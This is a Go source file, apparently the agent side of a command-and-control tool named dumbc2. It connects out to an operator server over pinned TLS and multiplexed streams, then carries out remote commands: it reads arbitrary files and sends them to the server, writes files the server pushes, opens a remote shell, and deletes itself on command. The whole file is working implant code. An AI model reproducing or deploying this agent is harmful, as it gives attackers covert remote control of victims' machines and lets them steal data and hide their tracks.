package useri

import (
	"bytes"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"github.com/hashicorp/yamux"
	"github.com/kmahyyg/dumbc2/buildtime"
	"github.com/kmahyyg/dumbc2/config"
	"github.com/kmahyyg/dumbc2/remoteop"
	"github.com/kmahyyg/dumbc2/transport"
	"io/ioutil"
	"log"
	"net"
	"os"
	"time"
)

var ymcli *yamux.Session

func StartAgent(userOP *config.UserOperation) {
	servFGP := make([]byte, base64.StdEncoding.DecodedLen(len(buildtime.RemoteFingerprint)))
	_, err := base64.StdEncoding.Decode(servFGP, buildtime.RemoteFingerprint)
	if err != nil {
		log.Fatalln("Server Pinned Key Error.")
	}
	var errCounter = 0
	var curConn net.Conn
	for {
		if errCounter >= 3 {
			return
		}
		curConn, err = transport.TLSDialer(servFGP, buildtime.ClientCertificatePEM, buildtime.ClientCertificateKey, buildtime.CACertificate, userOP.ListenAddr)
		if err != nil {
			errCounter++
			log.Println(err)
			time.Sleep(5 * time.Minute)
		} else {
			break
		}
	}
	ymcli = nil
	ymconf := yamux.Config{
		AcceptBacklog:          256,
		EnableKeepAlive:        true,
		KeepAliveInterval:      time.Second * 20,
		ConnectionWriteTimeout: time.Minute * 5,
		MaxStreamWindowSize:    256 * 1024,
		LogOutput:              os.Stderr,
	}
	defer func() {
		_ = ymcli.Close()
		_ = curConn.Close()
	}()
	ymcli, err = yamux.Client(curConn, &ymconf)
	if err != nil {
		log.Fatalln(err)
	}
	ctrlstem, err := ymcli.Open()
	if err != nil {
		log.Fatalln(err)
	}
	defer func() {
		_ = ctrlstem.Close()
	}()
	_ = respond2Cmd(ctrlstem)
}

func respond2Cmd(ctrlstem net.Conn) error {
	for {
		var ccmd *remoteop.CmdMsg
		smbuf := make([]byte, 1300)
		// the single control message cannot be more than 1300 bytes
		// so read once
		rdint, err := ctrlstem.Read(smbuf)
		if err != nil {
			log.Println(err)
			return err
		} else {
			ccmd = &remoteop.CmdMsg{}
			err := json.Unmarshal(smbuf[0:rdint], ccmd)
			if err != nil {
				log.Println("Internal Error.")
				log.Fatalln(err)
			}
		}
		if ccmd.Status != remoteop.StatusOK {
			// server side command should always use status=0
			log.Fatalln(err)
		} else {
			switch ccmd.Cmd {
			case remoteop.CommandBOOM:
				remoteop.DeleteMyself()
				_, err := ctrlstem.Write(successResp(ccmd))
				if err != nil {
					log.Println(err)
					continue
				}
			case remoteop.CommandUPLD:
				err := ioutil.WriteFile(ccmd.Msg, []byte{0x1}, 0644)
				if err != nil {
					_, _ = ctrlstem.Write(failedResp(ccmd, remoteop.StatusFAILED, err))
					log.Println(err)
					continue
				}
				_, err = ctrlstem.Write(successResp(ccmd))
				if err != nil {
					log.Println(err)
					continue
				}
				datastem, err := ymcli.Open()
				if err != nil {
					log.Println(err)
					continue
				}
				var buf bytes.Buffer
				for ; buf.Len() < ccmd.NextSize; {
					smbuf := make([]byte, 1300)
					readint, err := datastem.Read(smbuf)
					if err != nil || readint == 0 {
						log.Println(err)
						_ = datastem.Close()
						break
					}
					buf.Write(smbuf)
				}
				_ = datastem.Close()
				err = ioutil.WriteFile(ccmd.Msg, buf.Bytes()[0:ccmd.NextSize], 0644)
				if err != nil {
					log.Println(err)
					continue
				}
				if ccmd.NextBinHash != fmt.Sprintf("%x", sha256.Sum256(buf.Bytes()[0:ccmd.NextSize])) {
					log.Println("** NOTE: THE DATA TRANSFERED MIGHT CORRUPTED, PLEASE VERIFY. **")
				}
				_, err = ctrlstem.Write(successResp(ccmd))
				if err != nil {
					log.Println(err)
					continue
				}
			case remoteop.CommandDWLD:
				fddata, err := ioutil.ReadFile(ccmd.Msg)
				if err != nil {
					_, _ = ctrlstem.Write(failedResp(ccmd, remoteop.StatusNEXISTS, err))
					log.Println(err)
					continue
				}
				nextFileInfoResp := &remoteop.CmdMsg{
					Status:      remoteop.StatusOK,
					Cmd:         ccmd.Cmd,
					Msg:         "success",
					HasNext:     true,
					NextIsBin:   true,
					NextSize:    len(fddata),
					NextBinHash: fmt.Sprintf("%x", sha256.Sum256(fddata)),
				}
				nextFileInfoJResp, err := json.Marshal(nextFileInfoResp)
				if err != nil {
					log.Println(err)
					continue
				}
				_, err = ctrlstem.Write(nextFileInfoJResp)
				if err != nil {
					log.Println(err)
					continue
				}
				datastem, err := ymcli.Open()
				if err != nil {
					log.Println(err)
					continue
				}
				_, err = datastem.Write(fddata)
				if err != nil {
					_ = datastem.Close()
					log.Println(err)
					continue
				}
				_ = datastem.Close()
			case remoteop.CommandBASH:
				_, err := ctrlstem.Write(successResp(ccmd))
				if err != nil {
					log.Println(err)
					continue
				}
				datastem, err := ymcli.Open()
				if err != nil {
					_, _ = ctrlstem.Write(failedResp(ccmd, remoteop.StatusFAILED, err))
				}
				remoteop.GetShell(datastem)
				_ = datastem.Close()
				continue
			default:
				log.Fatalln("Internal error.")
			}
		}
	}
	return nil
}

func successResp(req *remoteop.CmdMsg) []byte {
	resp := &remoteop.CmdMsg{
		Status:      remoteop.StatusOK,
		Cmd:         req.Cmd,
		Msg:         "success",
		HasNext:     false,
		NextIsBin:   false,
		NextSize:    0,
		NextBinHash: "",
	}
	jresp, err := json.Marshal(resp)
	if err != nil {
		log.Fatalln("Internal Error.")
	}
	return jresp
}

func failedResp(req *remoteop.CmdMsg, status int, err error) []byte {
	resp := &remoteop.CmdMsg{
		Status:      status,
		Cmd:         req.Cmd,
		Msg:         fmt.Sprintf("%s", err),
		HasNext:     false,
		NextIsBin:   false,
		NextSize:    0,
		NextBinHash: "",
	}
	jresp, err := json.Marshal(resp)
	if err != nil {
		log.Fatalln(err)
	}
	return jresp
}